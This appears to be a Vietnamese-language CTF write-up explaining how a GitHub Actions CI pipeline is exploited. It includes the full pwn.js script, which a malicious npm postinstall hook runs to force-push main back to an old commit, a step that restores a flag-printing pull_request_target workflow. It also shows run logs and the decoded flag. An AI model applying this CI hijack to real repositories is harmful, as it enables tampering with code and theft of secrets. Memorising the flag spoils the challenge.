# Writeup: Old Food Challenge (GPN CTF 2024)

## 1. Tổng quan thử thách
Thử thách cung cấp một repository chứa ứng dụng Node.js quản lý công thức món ăn (Fresh Bite). Thử thách có liên kết với một repository từ xa trên GitHub và có một workflow chạy CI kiểm tra các Pull Request.

Mục tiêu của chúng ta là đọc giá trị bí mật của `secrets.FLAG` được thiết lập trong repository từ xa.

---

## 2. Phân tích & Phát hiện
Khi kiểm tra lịch sử Git của repository, chúng ta phát hiện một số điểm mấu chốt:
1. **Lịch sử Workflow:**
   - Trong quá khứ (commit `6d6b8d3`), có một workflow tên là `.github/workflows/flag.yml` được thêm vào. Workflow này chạy sự kiện `pull_request_target` và có nhiệm vụ in ra Flag (được mã hóa base64 2 lần):
     ```yaml
     on:
       pull_request_target:
         branches: [main]
     jobs:
       flag:
         runs-on: ubuntu-latest
         steps:
           - name: Get flag
             run: echo ${{ secrets.FLAG }} | base64 | base64
     ```
   - Tuy nhiên, ở commit `23c38eb`, workflow này đã bị xóa hoàn toàn khỏi nhánh `main`.

2. **Cơ chế hoạt động của `pull_request_target`:**
   - Khác với `pull_request` chạy mã nguồn từ nhánh fork/nhánh PR, sự kiện `pull_request_target` chạy workflow được định nghĩa trên **nhánh đích** (base branch, ở đây là `main`) của repository gốc.
   - Do đó, nếu `.github/workflows/flag.yml` không còn tồn tại trên nhánh `main` ở trạng thái hiện tại (HEAD), việc gửi Pull Request mới sẽ không kích hoạt workflow này nữa.

3. **Quyền hạn của `GITHUB_TOKEN`:**
   - Trong cấu hình CI hiện tại (`ci.yml` chạy trên nhánh `main`), `GITHUB_TOKEN` được gán quyền:
     ```yaml
     permissions:
       contents: write
     ```
   - Điều này cho phép tiến trình chạy CI (Runner) có quyền ghi và đẩy mã nguồn (push) ngược lại repository gốc.
   - Tuy nhiên, GitHub áp dụng cơ chế bảo mật nghiêm ngặt: Một GitHub App/Token không có quyền `workflows: write` sẽ không thể đẩy commit tạo mới hoặc thay đổi các tệp workflow dưới `.github/workflows/`.

---

## 3. Ý tưởng khai thác (Exploit Vector)
Do không có quyền `workflows: write`, chúng ta không thể đẩy một commit mới phục hồi hoặc sửa đổi `flag.yml` lên nhánh `main`.

Tuy nhiên, chúng ta phát hiện ra một sơ hở:
- Commit `6d6b8d3` (chứa tệp `flag.yml`) **đã tồn tại sẵn** trong cơ sở dữ liệu Git của repository từ xa.
- Khi cập nhật con trỏ nhánh (reference update) tới một commit đã tồn tại sẵn từ trước trên hệ thống (ví dụ: force push đưa con trỏ nhánh `main` quay về commit `6d6b8d3`), GitHub **không cần tạo mới hay sửa đổi bất kỳ đối tượng commit/workflow nào**. Nó chỉ di chuyển nhãn nhánh `main` về quá khứ.
- Quyền `contents: write` là đủ để thực hiện thao tác force-push cập nhật con trỏ nhánh này.

Kịch bản tấn công:
1. Tạo một Pull Request hoặc cập nhật PR hiện có từ nhánh fork. Hành động này sẽ kích hoạt workflow `CI` (được định nghĩa trong `.github/workflows/ci.yml` hiện tại vẫn đang chạy với quyền `contents: write`).
2. Sử dụng đoạn mã hook `postinstall` trong `package.json` để chạy script mã độc (`pwn.js`) khi Runner thực hiện lệnh `npm ci`.
3. Script `pwn.js` sẽ chạy lệnh:
   ```bash
   git push origin 6d6b8d303d16b05a5d38c8abc38c6bd28e19e240:main --force
   ```
   Lệnh này đưa nhánh `main` của repo gốc quay ngược thời gian về commit `6d6b8d3`, từ đó khôi phục lại sự tồn tại của workflow `flag.yml` trên nhánh `main`.
4. Sau khi nhánh `main` đã chứa `flag.yml`, bất kỳ cập nhật tiếp theo nào trên PR (chẳng hạn một commit thay đổi README) sẽ kích hoạt sự kiện `pull_request_target` trên nhánh `main` và chạy workflow `flag.yml`.
5. Workflow `flag.yml` thực thi, in ra Flag đã được mã hóa base64 hai lần. Chúng ta chỉ cần giải mã kết quả từ log để lấy Flag.

---

## 4. Các bước thực hiện chi tiết

### Bước 1: Thiết lập payload đưa `main` về commit cũ
Chúng ta tạo tệp `pwn.js` ở nhánh PR của fork thực hiện cấu hình git và force-push commit cũ:
```javascript
const { execSync } = require('child_process');

function sh(cmd) {
  try {
    return execSync(cmd, { encoding: 'utf8' }).trim();
  } catch (e) {
    console.log(`Command failed: ${cmd}`);
    throw e;
  }
}

console.log("Configuring git...");
sh('git config user.name "github-actions[bot]"');
sh('git config user.email "41898282+github-actions[bot]@users.noreply.github.com"');

console.log("Fetching origin...");
sh('git fetch origin');

console.log("Attempting force push of 6d6b8d3 to main...");
try {
  const out = sh('git push origin 6d6b8d303d16b05a5d38c8abc38c6bd28e19e240:main --force');
  console.log("PUSH SUCCESS:", out);
} catch (e) {
  console.log("PUSH FAILED");
}
```

Trong `package.json`, thêm cấu hình chạy `pwn.js` sau khi cài đặt dependency:
```json
"scripts": {
  "postinstall": "node pwn.js"
}
```

### Bước 2: Trigger tiến trình CI đầu tiên
Đẩy commit chứa payload lên nhánh PR của fork. Workflow CI của repository gốc chạy bước `npm ci`, kích hoạt `postinstall` và thực hiện force push thành công:
```text
Attempting force push of 6d6b8d3 to main...
To https://github.com/GPNCTF24-2/245346359_nmhuei_old-food-challenge
 + b4d99d1...6d6b8d3 6d6b8d303d16b05a5d38c8abc38c6bd28e19e240 -> main (forced update)
PUSH SUCCESS: 
```

### Bước 3: Reset và gửi commit sạch để kích hoạt workflow flag
Sau khi `main` đã quay về commit `6d6b8d3`, chúng ta dọn dẹp các tệp payload trên nhánh PR để tránh lỗi kiểm thử, reset nhánh cục bộ về cùng trạng thái với `main` mới (`6d6b8d3`), thêm một thay đổi nhỏ (như cập nhật tài liệu `README.md`), và force push lên fork:
```bash
git reset --hard origin/main
echo "- Meal planning" >> README.md
git commit -am "docs: update readme"
git push fork exploit/pr-rce --force
```

### Bước 4: Đọc Flag từ Log
Hành động cập nhật PR này lập tức kích hoạt workflow `.github/workflows/flag.yml` vừa được khôi phục trên nhánh `main`. 

Từ log chạy của job `flag` (ID `27056625106`):
```text
flag	Get flag	2026-06-06T07:48:12.4375223Z UjFCT1ExUkdlM0psTlhWU1VrVmpOMTgzU0dWZmQyOVNhMFpNTUhkZlVqRlFYemRJUlY4MmJFOXlh
flag	Get flag	2026-06-06T07:48:12.4377655Z VzlWVTE5RVFWbHpYMjlHWDNCMQpNVEZmVWpOUmRUTTFWRjkwWVZKSFJYUjlDZz09Cg==
```

Giải mã base64 lần 1:
```bash
$ echo -n 'UjFCT1ExUkdlM0psTlhWU1VrVmpOMTgzU0dWZmQyOVNhMFpNTUhkZlVqRlFYemRJUlY4MmJFOXlhVzlWVTE5RVFWbHpYMjlHWDNCMQpNVEZmVWpOUmRUTTFWRjkwWVZKSFJYUjlDZz09Cg==' | base64 -d
R1BOQ1RGe3JlNXVSUkVjN183SGVfd29Sa0ZMMHdfUjFQXzdIRV82bE9yaW9VU19EQVlzX29GX3B1
MTFfUjNRdTM1VF90YVJHRXR9Cg==
```

Giải mã base64 lần 2:
```bash
$ echo -n 'R1BOQ1RGe3JlNXVSUkVjN183SGVfd29Sa0ZMMHdfUjFQXzdIRV82bE9yaW9VU19EQVlzX29GX3B1MTFfUjNRdTM1VF90YVJHRXR9Cg==' | base64 -d
GPNCTF{re5uRREc7_7He_woRkFL0w_R1P_7HE_6lOrioUS_DAYs_oF_pu11_R3Qu35T_taRGEt}
```

---

## 5. Kết luận (Flag)
Flag của thử thách:
```text
GPNCTF{re5uRREc7_7He_woRkFL0w_R1P_7HE_6lOrioUS_DAYs_oF_pu11_R3Qu35T_taRGEt}
```
 Thử thách kiểm tra hiểu biết sâu sắc về Git, cơ chế kích hoạt của GitHub Actions (`pull_request_target`) và sự phân tách quyền giữa thao tác cập nhật cấu trúc nhánh/tệp tin thông thường với cấu hình CI/CD (`workflows: write`).
